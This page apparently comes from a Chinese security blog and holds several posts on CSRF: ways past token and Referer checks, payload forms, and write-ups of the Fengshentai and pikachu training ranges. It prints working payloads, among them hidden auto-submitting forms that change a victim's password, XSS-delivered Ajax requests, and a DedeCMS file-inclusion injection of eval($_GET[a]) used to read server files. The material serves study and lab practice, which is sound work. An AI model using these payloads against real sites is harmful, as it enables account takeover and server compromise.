<h4 id="7-再次输入密码"><a href="#7-再次输入密码" class="headerlink" title="7. 再次输入密码"></a>7. 再次输入密码</h4><ul>
<li>让用户再次输入密码，也是用来确认请求是否由用户自愿发起的一种方法</li>
<li>用于其他目的<ul>
<li>在用户下订单之前，再次向用户确认购买意向</li>
<li>能够确认此时在电脑前操作的确实是用户本人</li>
</ul>
</li>
<li>▲ 对于其他的页面（如注销处理）来说，让用户再次输入密码，反而会降低应用的易用性</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF--Token%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF--Token%E7%BB%95%E8%BF%87/" itemprop="url">CSRF--Token绕过</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:10:42+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  584 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-结合XSS漏洞"><a href="#1-结合XSS漏洞" class="headerlink" title="1. 结合XSS漏洞"></a>1. 结合XSS漏洞</h4><ul>
<li>背景：信息的修改需要带上一个服务器段修改的Token，且每次刷新，Token都会发生改变</li>
<li>绕过方法：结合XSS漏洞<ul>
<li>找到同站点内一个有XSS漏洞的站点</li>
<li>往XSS漏洞里面注入下面的代码<ul>
<li>attach()函数用于获取user_token</li>
<li>一个iframe标签用于隐藏访问获取一个Token</li>
<li>一个form表单用于将修改的密码与Token进行提交数据库</li>
</ul>
</li>
</ul>
</li>
<li>结合XSS漏洞的原因<ul>
<li>单独在外面使用js文件，会存在同源策略的问题</li>
<li>简化版抓取Token：<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElenentsByName(&#39;user_token&#39;)[0].value)&gt;</code></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function attack()&#123;</span><br><span class="line"></span><br><span class="line">    document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line"></span><br><span class="line">    document.getElementById(&quot;transfer&quot;).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://192.168.0.109/xxx&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/xxx&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-论坛网站"><a href="#2-论坛网站" class="headerlink" title="2. 论坛网站"></a>2. 论坛网站</h4><ul>
<li>在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上token，黑客可以在自己的网站上得到这个token，并马上就可以发动CSRF攻击</li>
</ul>
<h4 id="3-JSON数据去POST作为Token"><a href="#3-JSON数据去POST作为Token" class="headerlink" title="3. JSON数据去POST作为Token"></a>3. JSON数据去POST作为Token</h4><ul>
<li>前提：无对Token的检测</li>
<li>利用：可以任意构造Token进行绕过</li>
<li>▲ 具体细节见云服务器上关于JSON CSRF的一些思考</li>
</ul>
<h4 id="4-使用JSONP跨域去请求Token"><a href="#4-使用JSONP跨域去请求Token" class="headerlink" title="4. 使用JSONP跨域去请求Token"></a>4. 使用JSONP跨域去请求Token</h4><ul>
<li>前提<ul>
<li>请求是不检查Referer</li>
<li>使用JSONP去跨域生成Token</li>
<li>回传参数可以得出，默认为callback</li>
<li>能够fuzz出一定回调参数的值</li>
</ul>
</li>
<li>利用：构造callback的值，发送JSONP请求，获取Token，进行表单构造利用，引诱点击<ul>
<li>▲ Token的值也可能与其他参数有关</li>
</ul>
</li>
<li>▲ 具体细节见云服务器上分享一个jsonp劫持造成的新浪某社区CSRF蠕虫</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF--Referer%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF--Referer%E7%BB%95%E8%BF%87/" itemprop="url">CSRF--Referer绕过</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:10:42+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  237 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-添加无Referer标签"><a href="#1-添加无Referer标签" class="headerlink" title="1. 添加无Referer标签"></a>1. 添加无Referer标签</h4><ul>
<li>逻辑刚好没判断无Referer的情况</li>
<li><code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;</span><br><span class="line">    &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-简单对字段的判断"><a href="#2-简单对字段的判断" class="headerlink" title="2. 简单对字段的判断"></a>2. 简单对字段的判断</h4><ul>
<li>校验只是判断是否包含</li>
<li>如<code>stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ])</code></li>
<li>这时候Referer中只需要含有Host的头的内容即可</li>
</ul>
<h4 id="3-有Referer，但无对Referer的检测"><a href="#3-有Referer，但无对Referer的检测" class="headerlink" title="3. 有Referer，但无对Referer的检测"></a>3. 有Referer，但无对Referer的检测</h4>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF--Payload%E5%BD%A2%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF--Payload%E5%BD%A2%E5%BC%8F/" itemprop="url">CSRF--Payload形式</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:10:42+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  618 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-构造链接"><a href="#1-构造链接" class="headerlink" title="1. 构造链接"></a>1. 构造链接</h4><ul>
<li><a href="http://192.168.0.109/xxxxx/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/xxxxx/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>当受害者点击了这个链接，他的密码就会被改成test</li>
<li>▲ CSRF最关键的是利用受害者的cookie向服务器发伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面</li>
</ul>
<h4 id="2-使用短链接来隐藏URL"><a href="#2-使用短链接来隐藏URL" class="headerlink" title="2. 使用短链接来隐藏URL"></a>2. 使用短链接来隐藏URL</h4><ul>
<li><a href="http://dwz.cn/" target="_blank" rel="noopener">http://dwz.cn/</a>….</li>
<li>实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的.</li>
<li>但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也不适合现实生活</li>
</ul>
<h4 id="3-构造攻击页面"><a href="#3-构造攻击页面" class="headerlink" title="3. 构造攻击页面"></a>3. 构造攻击页面</h4><ul>
<li>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成</li>
<li>当受害者访问攻击页面时，会误认为是自己点击的是一个失效的url，实际上已经遭受了CSRF攻击，密码已经被修改了</li>
<li>▲ form标点提交参数后页面会进行跳换，可以通过内嵌iframe方式可以阻止页面跳转</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body onload=&quot;javascript:csrf()&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function csrf()&#123;</span><br><span class="line">        document.getElementById(&quot;button&quot;).click();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">   form&#123;</span><br><span class="line">        display: none;</span><br><span class="line">   &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/xxx/&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Click Me&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="4-结合XSS漏洞的Ajax请求"><a href="#4-结合XSS漏洞的Ajax请求" class="headerlink" title="4. 结合XSS漏洞的Ajax请求"></a>4. 结合XSS漏洞的Ajax请求</h4><ul>
<li>找到同站点内一个有XSS漏洞的站点</li>
<li>往站点里面插入下列构造的ajax，等待管理员触发</li>
<li>▲ 结合具体的数据包来构造ajax代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line">if(window.XMLHttpRequest)&#123;</span><br><span class="line">  xmlhttp=new XMLHttpRequest();</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;/xxx?act=add&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;admin=123&amp;password=admin&amp;password3=admin&amp;button=提交数据&quot;);</span><br></pre></td></tr></table></figure>


<h4 id="5-内容来源"><a href="#5-内容来源" class="headerlink" title="5. 内容来源"></a>5. 内容来源</h4><ul>
<li>▲ 本节内容来自部分来自婷婷哈大佬和部分来自bmjoker大佬</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/" itemprop="url">CSRF靶场--封神台</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:08:22+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  566 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
<li>点开题目链接，审计一下题目<ul>
<li>flag就在网站根目录 -&gt; 盲猜需要用到文件包含的思路</li>
<li>后台密码为admin123<ul>
<li>这么说需要找到后台，联想到本次作业为CSRF，登陆后台，借助管理员的Cookie就成立了</li>
<li>后台密码为admin123，盲猜用户名为admin或者root</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-name.png" alt="csrf-name"></p>
<ul>
<li>点开链接<ul>
<li>发现没有什么东西，网站目录也不是在根目录</li>
<li>右键查看源代码，ctrl+f搜索dedecms，可以发现dedecms的版本</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-version.png" alt="csrf-version"></p>
<ul>
<li>百度搜索dedecms，大多都是DedeCMS V57_UTF8_SP2版本的（真多漏洞）</li>
<li>DedeCMS-V5.7_UTF8_SP1版本的，SQL注入，文件包含<ul>
<li>只关心文件包含getshell的</li>
</ul>
</li>
<li>发现一个CSDN上的链接<br>(weixin_33921089大佬的链接)[<a href="https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]</a></li>
<li>分析源码可知，漏洞在/dede/sys_verifies.php下<ul>
<li>需要一个url中输入action，即getfiles</li>
<li>然后会打开一个cacheFile=DEDEDATA.’/modifytmp.inc文件</li>
<li>开始输入，发现包含了一个php的头</li>
<li>foreach输入然后进行replace，可以用反斜线双引号</li>
<li>涉及payload为：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\\&quot;;eval($_GET[a]);die();//</code></li>
</ul>
</li>
<li>这时候需要另外一个包含inc文件且能执行的，发现在后面的代码中，有一个通过action=down来执行，包含inc文件的，触发shell：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code></li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-code.png" alt="csrf-code"></p>
<ul>
<li>信息收集一下，发现后台是/csrf/uploads/dede/login.php<ul>
<li>弱口令admin/admin123登陆成功</li>
<li>这时候浏览器应该有管理员的Cookie了</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-login.png" alt="csrf-login"></p>
<ul>
<li>payload尝试<ul>
<li>插入shell</li>
<li>执行shell</li>
<li>拿到phpinfo的信息</li>
<li>搜索ducument，发现网站根目录</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-phpinfo.png" alt="csrf-phpinfo"></p>
<ul>
<li>既然有了shell，读取一下网站根目录</li>
<li>payload<ul>
<li>继续使用action=down</li>
<li>写入dir的路径</li>
<li>scandir扫描路径</li>
<li>print打印输出所有的文件</li>
<li>action=down&amp;a=$dir=dirname(‘C:/phpStudy/WWW/csrf/uploads/‘);$file = scandir($dir);print_r($file);</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-root.png" alt="csrf-root"> </p>
<ul>
<li>既然有了路径，那就读取吧</li>
<li>payload：action=down&amp;a=readfile(‘C:/phpStudy/WWW/csrf/flag.php’);</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-flag.png" alt="csrf-flag"></p>
<ul>
<li>留有疑问<ul>
<li>前面代码审计那里，payload的refiles[1]的绕过//“,是对什么的绕过？</li>
</ul>
</li>
</ul>
<h4 id="2-靶场说明"><a href="#2-靶场说明" class="headerlink" title="2. 靶场说明"></a>2. 靶场说明</h4><ul>
<li>⭐ 感谢白熊老哥提供的封神台靶场练习，跟真的在挖洞一样，难度倍增，收获也很多</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--pikachu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--pikachu/" itemprop="url">CSRF靶场--pikachu</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:08:22+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  399 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-CSRF-get"><a href="#1-CSRF-get" class="headerlink" title="1. CSRF(get)"></a>1. CSRF(get)</h4><ul>
<li>右上角的提示，发现有多个账号可以登陆</li>
<li>账号：vince/allen/kobe/grady/kevin/lucy/lili 密码：123456</li>
<li>选择vince/123456登陆</li>
<li>发现可以修改个人信息，既然是get的请求，那我bp抓包一下并修改</li>
<li>发觉数据都可以进行修改，还带了Cookie</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-get-data.png" alt="csrf-get-data"></p>
<p><img src="/images/csrf/pikachu/csrf-get-change.png" alt="csrf-get-change"></p>
<h4 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2. CSRF(post)"></a>2. CSRF(post)</h4><ul>
<li>登陆进来，一样的账户，一样的界面，但不一样的，是抓包发现的，是post数据</li>
<li>一样的修改数据，一样的带了Cookie</li>
<li>▲ bp的proxy会返回200OK，Repeater会返回302，但是都修改成功</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-post-data.png" alt="csrf-post-data"></p>
<p><img src="/images/csrf/pikachu/csrf-post-change.png" alt="csrf-post-change"></p>
<h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3. CSRF Token"></a>3. CSRF Token</h4><ul>
<li>登陆进来，一样的账户，一样的界面，又再一次抓包，发现这次是多了token</li>
<li>▲ 每次刷新，Token都不一样</li>
<li>只有在点击修改个人信息的时候，会去访问一个token_get_edit.php的页面，才会获得一个Token，且隐藏在一个hidden的表单中，这是可以利用的就是token_get_edit.php的页面</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-token.png" alt="csrf-token"></p>
<ul>
<li>攻击思路<ul>
<li>同样找一个有XSS漏洞的页面，插入一个iframe：<code>&lt;iframe src=&quot;../csrf&quot;&gt;</code>，可能需要修改maxlength的长度</li>
<li>发现可以拿到hidden中的Token：698085e82ed2acb762985707895</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-iframe.png" alt="csrf-iframe"></p>
<ul>
